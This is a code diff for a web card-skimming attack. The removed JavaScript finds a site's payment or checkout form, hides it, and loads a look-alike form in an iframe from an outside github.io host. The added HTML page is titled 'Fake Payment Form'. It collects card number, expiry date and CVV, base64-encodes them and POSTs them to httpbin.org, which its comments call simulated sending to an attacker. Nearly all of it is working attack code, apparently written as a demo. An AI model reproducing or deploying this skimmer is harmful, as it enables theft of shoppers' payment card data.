@@ -1,40 +1,91 @@
-// Wait for the document to load
-(function() {
-    // Function to create and insert the iframe with the fake form
-    const createThirdPartyIframeWithFakeForm = (originalForm) => {
-        const iframe = document.createElement('iframe');
-        iframe.style.width = '100%';
-        iframe.style.height = '400px'; // Adjust height as needed
-        iframe.style.border = 'none';
-        iframe.src = 'https://big-levovsky.github.io/fakefrom/'; // URL of the third-party iframe content
-
-        // Insert the iframe before the original form
-        originalForm.parentNode.insertBefore(iframe, originalForm);
-
-        // Hide the original form
-        originalForm.style.display = 'none';
-
-        //Simulate a delay and then redirect to the original form
-        setTimeout(() => {
-            window.location.href=window.location.href // Redirect to the original form page
-        }, 10000); // Delay for 2 seconds
-
-    };
-
-    // Function to replace the real form with the iframe containing the fake form
-    const replaceFormWithIframe = () => {
-        // Find the real payment form using a combined selector
-        let originalForm = document.querySelector('form input[id*="cvv"], form input[id="card-number"], form[action*="payment"], form[action*="checkout"], form[action*="order"], form.payment-form, form#payment-form');
-
-        if (originalForm) {
-            // Get the parent form element
-            originalForm = originalForm.closest('form');
-
-            // Create and insert the iframe with the fake form
-            createThirdPartyIframeWithFakeForm(originalForm);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Payment Form</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: white;
         }
-    };
+        form {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+    </style>
+</head>
+<body>
+<form id="fake-payment-form">
+    <h2>Payment Information</h2>
+    <label for="fake-card-number">Card Number:</label>
+    <input type="text" id="fake-card-number" name="card-number" required><br><br>
+    <label for="fake-expiry-date">Expiry Date:</label>
+    <input type="text" id="fake-expiry-date" name="expiry-date" required><br><br>
+    <label for="fake-cvv">CVV:</label>
+    <input type="text" id="fake-cvv" name="cvv" required><br><br>
+    <button type="submit">Submit</button>
+</form>
+<script>
+    document.getElementById('fake-payment-form').addEventListener('submit', function (e) {
+        e.preventDefault();
+        const ccData = {};
+        ccData['cardNumber'] = document.getElementById('fake-card-number').value;
+        ccData['expiryDate'] = document.getElementById('fake-expiry-date').value;
+        ccData['cvv'] = document.getElementById('fake-cvv').value;
 
-    // Call the replaceFormWithIframe function
-    replaceFormWithIframe();
-})();
+        // Send the data to an external server (simulated)
+        sendData(ccData);
+
+        // Send the data to an external server (simulated)
+        // console.log('Sending card details to attacker:');
+        // console.log('Card Number:', cardNumber);
+        // console.log('Expiry Date:', expiryDate);
+        // console.log('CVV:', cvv);
+
+        // Remove the fake form after submission and show a confirmation message
+        this.innerHTML = '<p>Payment submitted. Loading original form...</p>';
+
+        // Simulate a delay and then redirect to the original form
+        // setTimeout(() => {
+        //     window.location.href = 'URL_OF_ORIGINAL_FORM_PAGE'; // Redirect to the original form page
+        // }, 2000); // Delay for 2 seconds
+    });
+
+    const sendData = (ccData) => {
+        // Basic obfuscation using base64 encoding
+        const obfuscate = (data) => {
+            return btoa(data);
+        };
+
+        let obfuscatedData = {
+            cardNumber: obfuscate(ccData.cardNumber),
+            expiryDate: obfuscate(ccData.expiryDate),
+            cvv: obfuscate(ccData.cvv)
+        };
+
+        // Simulate sending data to an external server
+        fetch('https://httpbin.org/post', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(obfuscatedData)
+        })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+    };
+</script>
+</body>
+</html>
